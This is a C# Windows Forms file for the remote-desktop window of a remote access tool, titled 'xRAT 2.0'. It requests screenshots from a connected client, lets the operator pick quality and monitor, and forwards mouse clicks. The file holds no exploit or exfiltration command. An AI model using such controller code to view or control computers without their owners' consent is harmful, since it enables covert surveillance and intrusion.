using System;
using System.Threading;
using System.Windows.Forms;
using xServer.Core;

namespace xServer.Forms
{
    public partial class frmRemoteDesktop : Form
    {
        private Client cClient;
        private bool keepRunning;
        private bool enableMouseInput;

        public frmRemoteDesktop(Client c)
        {
            cClient = c;
            cClient.Value.frmRDP = this;
            keepRunning = false;
            enableMouseInput = false;
            InitializeComponent();
        }

        private void frmRemoteDesktop_Load(object sender, EventArgs e)
        {
            this.Text = string.Format("xRAT 2.0 - Remote Desktop [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());

            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);

            btnHide.Left = (panelTop.Width / 2) - (btnHide.Width / 2);

            btnShow.Location = new System.Drawing.Point(377, 0);
            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);

            if (cClient.Value != null)
                new Core.Packets.ServerPackets.Monitors().Execute(cClient);
        }

        private void getDesktop()
        {
            keepRunning = true;

            while (keepRunning)
            {
                try
                {
                    this.Invoke((MethodInvoker)delegate
                    {
                        btnStart.Enabled = false;
                        btnStop.Enabled = true;
                    });

                    if (cClient.Value != null)
                    {
                        if (cClient.Value.lastDesktopSeen)
                        {
                            int Quality = 1;
                            this.Invoke((MethodInvoker)delegate
                            {
                                Quality = barQuality.Value;
                            });

                            new Core.Packets.ServerPackets.Desktop(Quality, cbMonitors.SelectedIndex).Execute(cClient);
                            cClient.Value.lastDesktopSeen = false;
                        }
                    }
                    Thread.Sleep(100);
                }
                catch
                { }
            }

            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    btnStart.Enabled = true;
                    btnStop.Enabled = false;
                });
            }
            catch
            { }

            keepRunning = false;
        }

        private void frmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            keepRunning = false;
            if (cClient.Value != null)
                cClient.Value.frmRDP = null;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (!keepRunning)
                new Thread(getDesktop).Start();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            keepRunning = false;
        }

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            switch (barQuality.Value)
            {
                case 1:
                    lblQualityShow.Text = "Speed";
                    break;
                case 2:
                    lblQualityShow.Text = "Quality";
                    break;
            }
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            if (enableMouseInput)
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnMouse.Image = Properties.Resources.mouse_delete;
                enableMouseInput = false;
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnMouse.Image = Properties.Resources.mouse_add;
                enableMouseInput = true;
            }
        }

        private void picDesktop_MouseClick(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && enableMouseInput)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = local_x * picDesktop.Image.Width / picDesktop.Width;
                int remote_y = local_y * picDesktop.Image.Height / picDesktop.Height;

                bool left = true;
                if (e.Button == MouseButtons.Right)
                    left = false;

                if (cClient != null)
                    new Core.Packets.ServerPackets.MouseClick(left, false, remote_x, remote_y).Execute(cClient);
            }
        }

        private void picDesktop_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && enableMouseInput)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = local_x * picDesktop.Image.Width / picDesktop.Width;
                int remote_y = local_y * picDesktop.Image.Height / picDesktop.Height;

                bool left = true;
                if (e.Button == MouseButtons.Right)
                    left = false;

                if (cClient != null)
                    new Core.Packets.ServerPackets.MouseClick(left, true, remote_x, remote_y).Execute(cClient);
            }
        }

        private void frmRemoteDesktop_Resize(object sender, EventArgs e)
        {
            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);
            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            panelTop.Visible = false;
            btnShow.Visible = true;
            btnHide.Visible = false;
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            panelTop.Visible = true;
            btnShow.Visible = false;
            btnHide.Visible = true;
        }
    }
}
